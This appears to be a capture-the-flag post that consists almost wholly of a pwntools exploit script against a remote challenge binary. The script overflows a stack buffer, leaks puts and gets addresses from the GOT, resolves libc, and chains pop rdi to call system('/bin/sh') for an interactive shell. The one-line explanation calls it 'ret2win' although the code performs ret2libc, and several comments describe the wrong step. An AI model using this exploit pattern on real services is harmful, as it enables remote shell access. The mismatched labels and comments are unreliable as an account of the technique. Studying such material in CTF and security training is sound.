# Classic


test

<!--more-->

```python
#setup pwntools
from pwn import *
context(arch='amd64', os='linux')


#setup binary
exe = ELF('./mainah')
p = process(exe.path)
context.log_level = "critical"

#nc 134.209.150.149 4444
p = remote("134.209.150.149", 4444)

# Calculate the offset to the return address
offset = 40  # 32 bytes for the buffer + 8 bytes for saved RBP

# Find the address of the win function (replace with the correct function)
id_addr = exe.symbols['id']  # Assuming there's a win function

# Print the win function address
print("id function address: " + hex(id_addr))

# Addresses
ret_addr = 0x0000000000401016
pop_rdi = 0x000000000040115a

#GOT 
puts_got = exe.got['puts']

#PLT
puts_plt = exe.plt['puts']

#main
main = exe.symbols['main']

#payload to leak puts
payload = flat(
    b'A' * offset,  # Overflow buffer and overwrite RBP
    ret_addr,
    pop_rdi,       # Overwrite return address with win() function address
    puts_got,        # Overwrite return address with win() function address
    puts_plt,
    main
)

# Send the payload
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()

puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
print(f"puts@GLIBC: {hex(puts_leak)}")

#leak gets
payload = flat(
    b'A' * offset,  # Overflow buffer and overwrite RBP
    ret_addr,
    pop_rdi,       # Overwrite return address with win() function address
    exe.got['gets'],        # Overwrite return address with win() function address
    puts_plt,
    main
)

# Send the payload
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()

gets_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
print(f"gets@GLIBC: {hex(gets_leak)}")

#download libc
libc_filename = libcdb.search_by_symbol_offsets({'puts': puts_leak, 'gets': gets_leak}, select_index=1)

libc = ELF(libc_filename)
libc.address = puts_leak - libc.sym['puts']

#system
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Final exploit
payload = flat(
    b'A' * offset,  # Overflow buffer and overwrite RBP
    ret_addr,
    pop_rdi,       # Overwrite return address with win() function address
    bin_sh,        # Overwrite return address with win() function address
    system,
)

p.sendline(payload)
p.interactive()

```

## Explanation

Simple ret2win

